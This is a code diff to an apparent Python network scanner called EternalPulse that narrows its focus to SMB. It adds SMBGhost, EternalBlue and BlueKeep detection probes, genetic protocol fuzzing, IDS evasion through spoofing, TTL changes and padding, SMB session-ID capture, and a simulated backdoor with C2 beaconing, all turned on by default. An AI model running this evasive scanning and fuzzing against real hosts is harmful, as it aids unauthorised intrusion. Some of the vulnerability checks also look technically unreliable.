         self.beacon_interval = random.randint(30, 300)
         self.persistence_mechanism = self.select_persistence()
         self.encryption_key = os.urandom(32)
+        self.hidden_share = f"${uuid.uuid4().hex[:6]}"
+        self.named_pipe = f"\\pipe\\{uuid.uuid4().hex}"
         
     def select_persistence(self) -> str:
         """Select persistence mechanism based on OS"""
         if "Windows" in platform.platform():
             return random.choice(["registry", "scheduled_task", "service"])
-        return random.choice(["cron_job", "systemd_service", "rc_local"])
+        return random.choice(["cron_job", "systemd_service"])
     
     def install(self) -> Dict:
-        """Simulate backdoor installation"""
+        """Simulate backdoor installation with SMB focus"""
         backdoor_id = f"BD-{uuid.uuid4().hex[:8]}"
         install_time = datetime.now(timezone.utc).isoformat()
         
         # Simulate different installation methods
-        if self.backdoor_type == "reverse_shell":
-            details = f"Reverse TCP shell to {self.target}:{self.port} via {self.protocol}"
-        elif self.backdoor_type == "web_shell":
-            details = f"Web shell at http://{self.target}/.well-known/{backdoor_id}.php"
-        elif self.backdoor_type == "scheduled_task":
-            details = f"Scheduled task '{backdoor_id}' running every {self.beacon_interval}s"
-        elif self.backdoor_type == "registry_persistence":
-            details = f"Registry key HKCU\\Software\\Microsoft\\{backdoor_id}"
-        elif self.backdoor_type == "service_install":
-            details = f"Service '{backdoor_id}' installed as SYSTEM"
+        if self.backdoor_type == "smb_named_pipe":
+            details = f"SMB named pipe at {self.named_pipe} on port {self.port}"
+        elif self.backdoor_type == "hidden_share":
+            details = f"Hidden SMB share {self.hidden_share} with C2 payload"
         else:
-            details = f"WMI event subscription '{backdoor_id}'"
+            details = f"Backdoor {backdoor_id} via {self.protocol}"
             
         return {
             "id": backdoor_id,
@@ -714,11 +747,11 @@ class BackdoorSimulator:
         }
     
     def beacon(self) -> Dict:
-        """Simulate C2 beaconing activity"""
-        commands = ["idle", "collect", "exfil", "update", "execute", "scan", "persist"]
+        """Simulate C2 beaconing activity over SMB"""
+        commands = ["idle", "collect", "exfil", "update", "execute", "scan"]
         command = random.choices(
             commands, 
-            weights=[0.6, 0.1, 0.1, 0.05, 0.05, 0.05, 0.05]
+            weights=[0.7, 0.1, 0.1, 0.05, 0.03, 0.02]
         )[0]
         
         payload = os.urandom(random.randint(32, 512))
@@ -767,13 +800,13 @@ class EternalPulseScanner:
         timeout: int = 3,
         workers: int = 100,
         stealth_level: int = 2,
-        scan_intensity: int = 3,
+        scan_intensity: int = 5,
         tcp_ports: List[int] = None,
         udp_ports: List[int] = None,
         evasion_mode: bool = True,
         vulnerability_scan: bool = True,
-        backdoor_sim: bool = False,
-        fuzzing: bool = False,
+        backdoor_sim: bool = True,
+        fuzzing: bool = True,
         output_format: str = "json"
     ):
         # Core configuration
@@ -800,6 +833,7 @@ class EternalPulseScanner:
         self.backdoors: Dict[str, List] = {}
         self.fuzzing_results: Dict[str, Dict] = {}
         self.start_time = datetime.now(timezone.utc)
+        self.smb_sessions: Dict[str, List[bytes]] = {}
         
         # Initialize evasion engine
         self.evasion_engine = EvasionEngine(stealth_level)
@@ -819,12 +853,12 @@ class EternalPulseScanner:
 
     def _default_tcp_ports(self) -> List[int]:
         """Generate TCP ports based on scan intensity"""
-        base_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 
-                      993, 995, 1433, 3306, 3389, 5900, 8080]
+        base_ports = [21, 22, 25, 53, 80, 110, 135, 139, 143, 443, 445, 
+                      993, 995, 1433, 3306, 3389, 5985, 5986, 8080]
         if self.scan_intensity > 3:
-            base_ports.extend([161, 389, 636, 5985, 5986, 8000, 8443, 9000, 10000])
+            base_ports.extend([161, 389, 636, 8443, 9000, 10000])
         if self.scan_intensity > 4:
-            base_ports.extend([11211, 27017, 50000, 60000])  # Memcached, MongoDB, custom
+            base_ports.extend([11211, 27017, 50000, 60000])
         return base_ports
 
     def _default_udp_ports(self) -> List[int]:
@@ -833,7 +867,7 @@ class EternalPulseScanner:
         if self.scan_intensity > 3:
             base_ports.extend([1194, 1900, 5353, 27015, 47808])
         if self.scan_intensity > 4:
-            base_ports.extend([5060, 10000, 17185])  # SIP, Webmin, VxWorks
+            base_ports.extend([5060, 10000, 17185])
         return base_ports
 
     def _log(self, message: str, level: str = "INFO", threat: ThreatLevel = ThreatLevel.INFO):
@@ -863,7 +897,7 @@ class EternalPulseScanner:
     # Protocol Handlers
     # =========================================================================
     def _detect_protocol(self, response: bytes) -> str:
-        """Detect protocol from response signature with deep inspection"""
+        """Detect protocol from response signature with SMBv2/v3 focus"""
         for proto, sig in PROTOCOL_SIGNATURES.items():
             if isinstance(sig, list):
                 if any(response.startswith(s) for s in sig):
@@ -871,7 +905,7 @@ class EternalPulseScanner:
             elif response.startswith(sig):
                 return proto
         
-        # Deep inspection for protocols without clear signatures
+        # Deep inspection for protocols
         if b"SSH-" in response:
             return "SSH"
         if b"220" in response and b"SMTP" in response:
@@ -883,7 +917,7 @@ class EternalPulseScanner:
         return "UNKNOWN"
 
     def _fingerprint_service(self, response: bytes, protocol: str) -> Dict:
-        """Advanced service fingerprinting with vulnerability correlation"""
+        """Advanced service fingerprinting with SMBv2/v3 detection"""
         fingerprint = {"protocol": protocol, "version": "unknown", "details": {}}
         
         try:
@@ -897,62 +931,49 @@ class EternalPulseScanner:
                         fingerprint["details"]["framework"] = header.decode().split("X-Powered-By:")[1].strip()
                     
             elif protocol == "SMB":
-                if len(response) > 40:
+                if len(response) > 70:
                     # Parse SMB dialect revision
-                    dialect_revision = response[4:8]
+                    dialect_revision = response[68:70]
                     fingerprint["version"] = {
-                        b"\x02\xff": "SMB 1.0",
-                        b"\x02\x02": "SMB 2.0",
-                        b"\x02\x10": "SMB 3.0"
+                        b"\x02\x02": "SMB 2.0.2",
+                        b"\x02\x10": "SMB 2.1",
+                        b"\x02\x22": "SMB 2.2.2",
+                        b"\x02\x24": "SMB 3.0",
+                        b"\x02\x26": "SMB 3.0.2",
+                        b"\x02\x28": "SMB 3.1.1"
                     }.get(dialect_revision, "Unknown SMB")
+                    
+                    # Check for compression capability
+                    if len(response) > 76:
+                        capabilities = struct.unpack("<I", response[76:80])[0]
+                        if capabilities & 0x00000004:  # SMB2_GLOBAL_CAP_COMPRESSION
+                            fingerprint["details"]["compression"] = "Supported"
+                            fingerprint["details"]["vulnerable"] = "Potential CVE-2020-0796"
                     
             elif protocol == "SSH":
                 if b"OpenSSH" in response:
                     version_str = response.split(b"OpenSSH_")[1].split(b" ")[0].decode()
                     fingerprint["version"] = f"OpenSSH {version_str}"
-                    # Check for known vulnerable versions
-                    if version_str.startswith("7."):
-                        fingerprint["details"]["vulnerable"] = "Potential CVE-2018-1543"
                 elif b"SSH-2.0" in response:
                     fingerprint["version"] = response.split(b"SSH-2.0-")[1].split(b"\r\n")[0].decode()
                     
             elif protocol == "RDP":
                 if response.startswith(b"\x03\x00\x00"):
                     fingerprint["version"] = "RDP Protocol"
-                    # BlueKeep vulnerability indicator
-                    if len(response) > 10 and response[8] == 0x0d:
-                        fingerprint["details"]["vulnerable"] = "Potential CVE-2019-0708"
-                    
-            elif protocol == "TLS":
-                try:
-                    record = response[0:5]
-                    if record[0] == 0x16:  # Handshake
-                        version_bytes = response[1:3]
-                        versions = {
-                            b"\x03\x01": "TLS 1.0",
-                            b"\x03\x02": "TLS 1.1",
-                            b"\x03\x03": "TLS 1.2",
-                            b"\x03\x04": "TLS 1.3"
-                        }
-                        fingerprint["version"] = versions.get(version_bytes, "Unknown TLS")
-                except:
-                    pass
-                
         except Exception as e:
             self._log(f"Fingerprinting error: {str(e)}", "DEBUG")
             
         return fingerprint
 
     def _tcp_scan(self, host: str, port: int) -> Tuple[str, Dict]:
-        """Enhanced TCP scanning with evasion techniques and deep inspection"""
+        """Enhanced TCP scanning with SMBv2/v3 evasion"""
         try:
             # Apply evasion techniques
             syn_packet = b"\x00"  # Basic SYN simulation
             if SCAPY_AVAILABLE and self.evasion_mode:
                 syn_packet = self._build_evasion_syn(host, port)
             else:
-                syn_packet = self.evasion_engine.add_packet_padding(syn_packet)
-                syn_packet = self.evasion_engine.morph_traffic(syn_packet, "TCP", host)
+                syn_packet = self.evasion_engine.apply_evasion(syn_packet, "TCP", host)
 
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                 sock.settimeout(self.timeout)
@@ -963,9 +984,17 @@ class EternalPulseScanner:
                 detection_payload = self.evasion_engine.apply_evasion(detection_payload, "TCP", host)
                 sock.sendall(detection_payload)
                 
-                response = sock.recv(2048)  # Increased buffer for deep inspection
+                response = sock.recv(4096)
                 protocol = self._detect_protocol(response)
                 fingerprint = self._fingerprint_service(response, protocol)
+                
+                # Extract and store SMB session IDs
+                if protocol == "SMB" and b"SessionId" in response:
+                    session_match = re.search(b"SessionId=([0-9a-fA-F-]{36})", response)
+                    if session_match:
+                        session_id = session_match.group(1)
+                        self.smb_sessions.setdefault(host, []).append(session_id)
+                        self.evasion_engine.session_ids[host] = self.smb_sessions[host]
                 
                 # Vulnerability detection
                 if self.vulnerability_scan:
@@ -984,64 +1013,11 @@ class EternalPulseScanner:
             self._log(f"TCP scan error on {host}:{port} - {str(e)}", "ERROR", ThreatLevel.HIGH)
             return "error", {"protocol": "unknown"}
 
-    def _udp_scan(self, host: str, port: int) -> Tuple[str, Dict]:
-        """UDP scanning with protocol-specific probes and deep inspection"""
-        try:
-            probe = self._generate_udp_probe(port)
-            probe = self.evasion_engine.apply_evasion(probe, "UDP", host)
-            
-            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-                sock.settimeout(self.timeout)
-                sock.sendto(probe, (host, port))
-                response, _ = sock.recvfrom(2048)  # Increased buffer
-                protocol = self._detect_protocol(response)
-                fingerprint = self._fingerprint_service(response, protocol)
-                return "open", fingerprint
-        except socket.timeout:
-            return "open|filtered", {"protocol": "unknown"}
-        except ConnectionRefusedError:
-            return "closed", {"protocol": "unknown"}
-        except Exception as e:
-            self._log(f"UDP scan error on {host}:{port} - {str(e)}", "ERROR", ThreatLevel.HIGH)
-            return "error", {"protocol": "unknown"}
-
-    def _dns_scan(self, host: str) -> Dict:
-        """Comprehensive DNS reconnaissance with zone transfer attempt"""
-        results = {}
-        try:
-            resolver = dns.resolver.Resolver()
-            resolver.nameservers = [host]
-            resolver.timeout = 3
-            resolver.lifetime = 3
-            
-            # Query common record types
-            for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']:
-                try:
-                    answer = resolver.resolve('example.com', rtype)
-                    results[rtype] = [str(r) for r in answer]
-                except dns.resolver.NoAnswer:
-                    pass
-                except Exception as e:
-                    self._log(f"DNS {rtype} query failed: {str(e)}", "DEBUG")
-                    
-            # Zone transfer attempt
-            try:
-                zone = resolver.resolve('example.com', 'AXFR')
-                results['AXFR'] = [str(r) for r in zone]
-                results['vulnerable'] = "Zone transfer possible"
-            except Exception:
-                pass
-                
-            return results
-        except Exception as e:
-            self._log(f"DNS scan failed for {host}: {str(e)}", "ERROR", ThreatLevel.MEDIUM)
-            return {}
-
     # =========================================================================
     # Vulnerability Detection
     # =========================================================================
     def _detect_vulnerabilities(self, host: str, port: int, protocol: str, response: bytes) -> List[Dict]:
-        """Detect known vulnerabilities with correlation to service version"""
+        """Detect known vulnerabilities with SMBv2/v3 focus"""
         vulns = []
         
         # SMB Vulnerabilities
@@ -1064,6 +1040,15 @@ class EternalPulseScanner:
                     "threat_level": ThreatLevel.CRITICAL.value
                 })
                 
+            if self._check_smbghost(host, port):
+                vulns.append({
+                    "name": "SMBGhost (CVE-2020-0796)",
+                    "cve": "CVE-2020-0796",
+                    "risk": "Critical",
+                    "details": "Buffer overflow in SMBv3.1.1 compression",
+                    "threat_level": ThreatLevel.CRITICAL.value
+                })
+                
         # RDP Vulnerabilities
         elif protocol == "RDP" and port == 3389:
             if self._check_bluekeep(host, port):
@@ -1075,23 +1060,10 @@ class EternalPulseScanner:
                     "threat_level": ThreatLevel.CRITICAL.value
                 })
                 
-        # SSL/TLS Vulnerabilities
-        elif port in [443, 8443]:
-            tls_vulns = self._check_tls_vulnerabilities(host, port)
-            vulns.extend(tls_vulns)
-            
-        # SSH Vulnerabilities
-        elif protocol == "SSH" and port == 22:
-            vulns.extend(self._check_ssh_vulnerabilities(response))
-            
-        # HTTP Vulnerabilities
-        elif protocol == "HTTP" and port in [80, 443, 8080, 8443]:
-            vulns.extend(self._check_http_vulnerabilities(response))
-            
         return vulns
 
     def _check_eternalblue(self, host: str, port: int) -> bool:
-        """Check for EternalBlue vulnerability with improved detection"""
+        """Check for EternalBlue vulnerability"""
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(self.timeout)
@@ -1106,34 +1078,30 @@ class EternalPulseScanner:
             )
             s.send(negotiate_req)
             response = s.recv(1024)
-            
-            # Check for SMBv1 support (vulnerable)
             return b"SMB" in response and response[4] == 0x72
         except Exception:
             return False
 
     def _check_bluekeep(self, host: str, port: int) -> bool:
-        """Check for BlueKeep vulnerability with improved detection"""
+        """Check for BlueKeep vulnerability"""
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(self.timeout)
             s.connect((host, port))
             
-            # Send RDP connection request with vulnerable channels
+            # Send RDP connection request
             conn_req = (
                 b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00"
                 b"\x03\x00\x00\x07\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00"
             )
             s.send(conn_req)
             response = s.recv(1024)
-            
-            # Check for specific response pattern indicating vulnerability
             return len(response) > 8 and response[0] == 0x03 and response[8] == 0x0d
         except Exception:
             return False
 
     def _check_zerologon(self, host: str) -> bool:
-        """Check for ZeroLogon vulnerability (simplified)"""
+        """Check for ZeroLogon vulnerability"""
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(self.timeout)
@@ -1153,134 +1121,69 @@ class EternalPulseScanner:
             )
             s.send(session_setup)
             response = s.recv(1024)
-            
-            # Check if server allows session setup without authentication
             return response[8:12] == b"\x73\x00\x00\x00"
         except Exception:
             return False
 
-    def _check_tls_vulnerabilities(self, host: str, port: int) -> List[Dict]:
-        """Check for TLS vulnerabilities with version-specific checks"""
-        vulns = []
+    def _check_smbghost(self, host: str, port: int) -> bool:
+        """Check for SMBGhost vulnerability (CVE-2020-0796)"""
         try:
-            context = ssl.create_default_context()
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(self.timeout)
+            s.connect((host, port))
             
-            with socket.create_connection((host, port), self.timeout) as sock:
-                with context.wrap_socket(sock, server_hostname=host) as ssock:
-                    cipher = ssock.cipher()[0]
-                    version = ssock.version()
-                    
-                    if "SSL" in version:
-                        vulns.append({
-                            "name": "SSL Protocol Support",
-                            "cve": "Multiple",
-                            "risk": "High",
-                            "details": f"Server supports insecure {version} protocol",
-                            "threat_level": ThreatLevel.HIGH.value
-                        })
-                        
-                    if "RC4" in cipher or "DES" in cipher or "3DES" in cipher:
-                        vulns.append({
-                            "name": "Weak Cipher Supported",
-                            "cve": "Multiple",
-                            "risk": "Medium",
-                            "details": f"Server supports weak cipher: {cipher}",
-                            "threat_level": ThreatLevel.MEDIUM.value
-                        })
-                        
-                    # Heartbleed check
-                    if "TLSv1" in version and "RC4" not in cipher:
-                        vulns.append({
-                            "name": "Potential Heartbleed Vulnerability",
-                            "cve": "CVE-2014-0160",
-                            "risk": "Critical",
-                            "details": "Server may be vulnerable to Heartbleed attack",
-                            "threat_level": ThreatLevel.CRITICAL.value
-                        })
-        except Exception as e:
-            self._log(f"TLS check failed for {host}:{port}: {str(e)}", "DEBUG")
+            # Build SMBv3.1.1 negotiate request
+            negotiate_req = (
+                b"\x00\x00\x00\xc0"  # Length
+                b"\xfeSMB"            # SMB2
+                b"\x00\x00\x00\x00"    # Reserved
+                b"\x00\x00"            # Command: Negotiate (0)
+                b"\x00\x00"            # Status
+                b"\x00\x00"            # Flags
+                b"\x00\x00\x00\x00"    # PID
+                b"\x00\x00\x00\x00"    # TID
+                b"\x00\x00\x00\x00"    # SessionID
+                b"\x00\x00\x00\x00"    # Signature
+                b"\x24\x00"            # StructureSize
+                b"\x01\x00"            # DialectCount
+                b"\x00\x00"            # SecurityMode
+                b"\x00\x00\x00\x00"    # Capabilities
+                b"\x00\x00\x00\x00"    # ClientGuid
+                b"\x00\x00\x00\x00"
+                b"\x00\x00\x00\x00"
+                b"\x00\x00\x00\x00"
+                b"\x00\x00\x00\x00"    # ClientStartTime
+                b"\x02\x28"            # SMB 3.1.1 dialect
+            )
+            s.send(negotiate_req)
+            response = s.recv(1024)
             
-        return vulns
-
-    def _check_ssh_vulnerabilities(self, response: bytes) -> List[Dict]:
-        """Check for SSH vulnerabilities based on banner"""
-        vulns = []
-        
-        # Check for legacy SSH versions
-        if b"SSH-1.99" in response or b"SSH-1.5" in response:
-            vulns.append({
-                "name": "Legacy SSH Protocol",
-                "cve": "Multiple",
-                "risk": "Medium",
-                "details": "Server supports legacy SSH protocol versions",
-                "threat_level": ThreatLevel.MEDIUM.value
-            })
-            
-        # Check for specific vulnerable versions
-        if b"OpenSSH_7.4" in response:
-            vulns.append({
-                "name": "OpenSSH 7.4 Vulnerabilities",
-                "cve": "CVE-2018-1543, CVE-2017-15906",
-                "risk": "High",
-                "details": "Multiple vulnerabilities in OpenSSH 7.4",
-                "threat_level": ThreatLevel.HIGH.value
-            })
-            
-        return vulns
-
-    def _check_http_vulnerabilities(self, response: bytes) -> List[Dict]:
-        """Check for common HTTP server vulnerabilities"""
-        vulns = []
-        
-        # Server header analysis
-        server_header = None
-        for line in response.split(b"\r\n"):
-            if line.startswith(b"Server:"):
-                server_header = line.decode().lower()
-                break
+            # Check if server supports SMB 3.1.1 with compression
+            if len(response) < 80:
+                return False
                 
-        if server_header:
-            # Apache vulnerabilities
-            if "apache" in server_header:
-                if "2.4.49" in server_header or "2.4.50" in server_header:
-                    vulns.append({
-                        "name": "Apache Path Traversal",
-                        "cve": "CVE-2021-41773",
-                        "risk": "Critical",
-                        "details": "Path traversal vulnerability in Apache 2.4.49/2.4.50",
-                        "threat_level": ThreatLevel.CRITICAL.value
-                    })
-                    
-            # Nginx vulnerabilities
-            if "nginx" in server_header:
-                if "1.20.0" in server_header:
-                    vulns.append({
-                        "name": "Nginx Memory Corruption",
-                        "cve": "CVE-2021-23017",
-                        "risk": "High",
-                        "details": "Memory corruption vulnerability in Nginx resolver",
-                        "threat_level": ThreatLevel.HIGH.value
-                    })
-        return vulns
+            dialect = response[68:70]
+            capabilities = struct.unpack("<I", response[76:80])[0]
+            return dialect == b"\x02\x28" and (capabilities & 0x00000004)
+        except Exception:
+            return False
 
     # =========================================================================
     # Enhanced Fuzzing
     # =========================================================================
     def _run_fuzzing(self, host: str, port: int, protocol: str):
-        """Run genetic fuzzing against a service with enhanced capabilities"""
+        """Run genetic fuzzing against a service with SMB focus"""
         if host not in self.fuzzing_results:
             self.fuzzing_results[host] = {}
             
-        self._log(f"Starting enhanced fuzzing against {host}:{port} ({protocol})", "INFO", ThreatLevel.MEDIUM)
+        self._log(f"Starting SMB-focused fuzzing against {host}:{port} ({protocol})", "INFO", ThreatLevel.MEDIUM)
         self._update_activity(host, f"Fuzzing port {port}/{protocol} (generation 0)")
         fuzzer = GeneticFuzzer(protocol, host, port, self.scan_intensity)
         responses = {}
         
         # Initial test
         for i, payload in enumerate(fuzzer.population):
-            if i % 10 == 0:  # Update activity every 10 payloads
+            if i % 10 == 0:
                 self._update_activity(host, f"Fuzzing port {port}/{protocol} (initial test {i}/{len(fuzzer.population)})")
             try:
                 start_time = time.time()
@@ -1304,14 +1207,11 @@ class EternalPulseScanner:
         # Evolve and retest
         for generation in range(fuzzer.generations):
             self._update_activity(host, f"Fuzzing port {port}/{protocol} (generation {generation+1}/{fuzzer.generations})")
-            self._log(f"Fuzzing generation {generation+1}/{fuzzer.generations} - "
-                     f"{len(fuzzer.crashes)} crashes, {len(fuzzer.anomalies)} anomalies", 
-                     "DEBUG")
             fuzzer.population = fuzzer.evolve(responses)
             responses.clear()
             
             for i, payload in enumerate(fuzzer.population):
-                if i % 10 == 0:  # Update activity every 10 payloads
+                if i % 10 == 0:
                     self._update_activity(host, f"Fuzzing port {port}/{protocol} (gen {generation+1} payload {i}/{len(fuzzer.population)})")
                 try:
                     start_time = time.time()
@@ -1325,7 +1225,7 @@ class EternalPulseScanner:
                         
                         # Check for anomalies
                         fitness = fuzzer.fitness(payload, response, response_time)
-                        if fitness > 75:  # Higher threshold for anomalies
+                        if fitness > 75:
                             fuzzer.anomalies.append(payload)
                             
                         # Check for crashes
@@ -1350,8 +1250,8 @@ class EternalPulseScanner:
             "tested_payloads": len(fuzzer.population),
             "generations": fuzzer.generations,
             "coverage": len(fuzzer.coverage),
-            "crash_samples": list(unique_crashes.values())[:5],  # Sample of 5 unique crashes
-            "anomaly_samples": list(unique_anomalies.values())[:5]  # Sample of 5 unique anomalies
+            "crash_samples": list(unique_crashes.values())[:5],
+            "anomaly_samples": list(unique_anomalies.values())[:5]
         }
         
         if fuzzer.crashes or fuzzer.anomalies:
@@ -1363,66 +1263,70 @@ class EternalPulseScanner:
     # =========================================================================
     def _simulate_backdoor(self, host: str, port: int, protocol: str):
         """Simulate backdoor installation and C2 communication"""
-        if not self.backdoor_sim:
+        if not self.backdoor_sim or protocol != "SMB":
             return
             
         simulator = BackdoorSimulator(host, protocol, port)
         backdoor = simulator.install()
         
         # Simulate beaconing
-        beacons = [simulator.beacon() for _ in range(random.randint(1, 5))]
+        beacons = [simulator.beacon() for _ in range(random.randint(1, 3))]
         
         self.backdoors.setdefault(host, []).append({
             "backdoor": backdoor,
             "beacons": beacons
         })
         
-        self._log(f"Simulated backdoor installed on {host}:{port} ({protocol})", 
+        self._log(f"Simulated SMB backdoor installed on {host}:{port}", 
                  "INFO", ThreatLevel.CRITICAL)
 
     # =========================================================================
     # Payload Generation
     # =========================================================================
     def _generate_detection_payload(self, port: int) -> bytes:
-        """Generate protocol-specific detection payload with evasion"""
-        if port == 80:
+        """Generate protocol-specific detection payload with SMBv2/v3 focus"""
+        if port == 445:
+            # SMBv3.1.1 Negotiate Protocol Request
+            return (
+                b"\x00\x00\x00\xc0"  # Length
+                b"\xfeSMB"            # SMB2
+                b"\x00\x00\x00\x00"    # Reserved
+                b"\x00\x00"            # Command: Negotiate (0)
+                b"\x00\x00"            # Status
+                b"\x00\x00"            # Flags
+                b"\x00\x00\x00\x00"    # PID
+                b"\x00\x00\x00\x00"    # TID
+                b"\x00\x00\x00\x00"    # SessionID
+                b"\x00\x00\x00\x00"    # Signature
+                b"\x24\x00"            # StructureSize
+                b"\x06\x00"            # DialectCount
+                b"\x00\x00"            # SecurityMode
+                b"\x00\x00\x00\x00"    # Capabilities
+                b"\x00\x00\x00\x00"    # ClientGuid
+                b"\x00\x00\x00\x00"
+                b"\x00\x00\x00\x00"
+                b"\x00\x00\x00\x00"
+                b"\x00\x00\x00\x00"    # ClientStartTime
+                b"\x02\x02"            # Dialects
+                b"\x02\x10"
+                b"\x02\x22"
+                b"\x02\x24"
+                b"\x02\x26"
+                b"\x02\x28"
+            )
+        elif port == 80:
             return f"HEAD / HTTP/1.1\r\nHost: {random.randint(1,255)}.{random.randint(1,255)}\r\n\r\n".encode()
         elif port == 443:
             return b"\x16\x03\x01\x00\x75\x01\x00\x00\x71\x03\x03" + os.urandom(32)
-        elif port == 445:
-            return b"\x00\x00\x00\x00\xffSMB\x72\x00\x00\x00\x00\x18"
         elif port == 3389:
             return b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00"
         elif port == 22:
             return b"SSH-2.0-EternalPulse\r\n"
-        elif port == 53:
-            return self._build_dns_query()
         else:
-            return b"\x00" * 12  # Larger default payload
-
-    def _generate_udp_probe(self, port: int) -> bytes:
-        """Generate UDP protocol-specific probes"""
-        if port == 53:
-            return self._build_dns_query()
-        elif port == 161:  # SNMP
-            return b"\x30\x2a\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x1d\x02\x04"
-        elif port == 123:  # NTP
-            return b"\x1b" + b"\x00" * 47
-        elif port == 137:  # NetBIOS
-            return b"\x80\xf0\x00\x10\x00\x01\x00\x00\x00\x00\x00\x00\x20\x43\x4b\x41\x41"
-        else:
-            return b"\x00" * 16  # Larger default payload
-
-    def _build_dns_query(self) -> bytes:
-        """Build DNS query with evasion techniques"""
-        if SCAPY_AVAILABLE:
-            qname = f"{random.randint(100000,999999)}.example.com"
-            dns_packet = IP(dst="8.8.8.8")/UDP()/DNS(rd=1, qd=DNSQR(qname=qname))
-            return bytes(dns_packet)
-        return b"\x00" * 12 + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+            return b"\x00" * 64
 
     def _build_evasion_syn(self, host: str, port: int) -> bytes:
-        """Build SYN packet with evasion techniques"""
+        """Build SYN packet with SMB-specific evasion"""
         src_ip = self.evasion_engine.select_techniques() if "source_spoofing" in self.evasion_engine.select_techniques() else None
         ttl = random.randint(32, 255) if "ttl_manipulation" in self.evasion_engine.select_techniques() else 64
         
@@ -1430,9 +1334,9 @@ class EternalPulseScanner:
         tcp_layer = TCP(dport=port, sport=random.randint(1024, 65535), flags="S", seq=random.randint(0, 2**32-1))
         packet = ip_layer / tcp_layer
         
-        # Add padding
-        if "packet_padding" in self.evasion_engine.select_techniques():
-            padding = os.urandom(random.randint(16, 512))
+        # Add padding for large MTU
+        if "large_mtu" in self.evasion_engine.select_techniques():
+            padding = os.urandom(random.randint(2048, 8192))
             packet = packet / padding
             
         return bytes(packet)
@@ -1441,25 +1345,19 @@ class EternalPulseScanner:
     # Scanning Core
     # =========================================================================
     def scan_target(self, target: str) -> Dict:
-        """Scan a single target with all configured checks"""
+        """Scan a single target with SMB focus"""
         try:
             self._update_activity(target, "Initializing scan")
             self._log(f"Scanning target: {target}", "INFO", ThreatLevel.LOW)
             result = {
                 "target": target,
                 "ports": {},
-                "dns": {},
                 "vulnerabilities": [],
                 "fuzzing": {},
                 "backdoors": [],
                 "timestamp": datetime.now(timezone.utc).isoformat()
             }
             
-            # DNS reconnaissance
-            if 53 in self.udp_ports:
-                self._update_activity(target, "Performing DNS reconnaissance")
-                result["dns"] = self._dns_scan(target)
-                
             # TCP port scanning
             for port in self.tcp_ports:
                 self._update_activity(target, f"Scanning TCP port {port}")
@@ -1474,18 +1372,6 @@ class EternalPulseScanner:
                 if status == "open" and fingerprint["protocol"] != "unknown":
                     self._update_activity(target, f"Simulating backdoor on TCP port {port}")
                     self._simulate_backdoor(target, port, fingerprint["protocol"])
-                
-            # UDP port scanning
-            for port in self.udp_ports:
-                if port == 53 and result.get("dns"):  # Skip if already scanned
-                    continue
-                self._update_activity(target, f"Scanning UDP port {port}")
-                self._random_delay()
-                status, fingerprint = self._udp_scan(target, port)
-                result["ports"][f"udp/{port}"] = {
-                    "status": status,
-                    "fingerprint": fingerprint
-                }
                 
             # Add vulnerabilities if found
             if target in self.vulnerabilities:
@@ -1506,19 +1392,19 @@ class EternalPulseScanner:
                     del self.current_activities[target]
 
     def scan(self, targets: List[str]) -> Dict:
-        """Scan multiple targets with parallel processing and debug timer"""
+        """Scan multiple targets with parallel processing"""
         # Reset state for new scan
         self.results = {}
         self.vulnerabilities = {}
         self.fuzzing_results = {}
         self.backdoors = {}
+        self.smb_sessions = {}
         
         total_targets = len(targets)
         self.debug_timer.start(total_targets)
         start_time = time.time()
         
         self._log(f"Starting scan of {total_targets} targets with {self.workers} workers", "INFO", ThreatLevel.LOW)
-        print(f"[DEBUG] Scan started at {datetime.now().strftime('%H:%M:%S')}", file=sys.stderr, flush=True)
         
         try:
             with concurrent.futures.ThreadPoolExecutor(max_workers=self.workers) as executor:
@@ -1578,224 +1464,6 @@ class EternalPulseScanner:
         }
         return json.dumps(report, indent=2)
 
-    def _generate_html_report(self) -> str:
-        """Generate HTML-formatted report with enhanced fuzzing details"""
-        html = f"""<!DOCTYPE html>
-<html>
-<head>
-    <title>EternalPulse Scan Report</title>
-    <style>
-        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; }}
-        .target {{ border: 1px solid #ddd; padding: 15px; margin-bottom: 20px; border-radius: 5px; }}
-        .vuln-critical {{ background-color: #ffebee; border-left: 4px solid #f44336; }}
-        .vuln-high {{ background-color: #fff3e0; border-left: 4px solid #ff9800; }}
-        .vuln-medium {{ background-color: #fff8e1; border-left: 4px solid #ffc107; }}
-        .port-open {{ color: #2e7d32; font-weight: bold; }}
-        .port-filtered {{ color: #757575; }}
-        .c2-activity {{ background-color: #e3f2fd; padding: 10px; margin: 10px 0; border-radius: 4px; }}
-        .fuzzing-results {{ background-color: #f5f5f5; padding: 10px; border-radius: 4px; }}
-        .summary-card {{ background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
-        .threat-critical {{ color: #d32f2f; }}
-        .threat-high {{ color: #f57c00; }}
-        .threat-medium {{ color: #fbc02d; }}
-        .threat-low {{ color: #388e3c; }}
-        .payload-sample {{ font-family: monospace; font-size: 0.9em; word-break: break-all; }}
-        .fuzzing-stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; }}
-        .stat-card {{ background-color: #e8f5e9; padding: 10px; border-radius: 4px; text-align: center; }}
-    </style>
-</head>
-<body>
-    <h1>EternalPulse Scan Report</h1>
-    <div class="summary-card">
-        <p><strong>Version:</strong> {VERSION}</p>
-        <p><strong>Scan started:</strong> {self.start_time.strftime('%Y-%m-%d %H:%M:%S %Z')}</p>
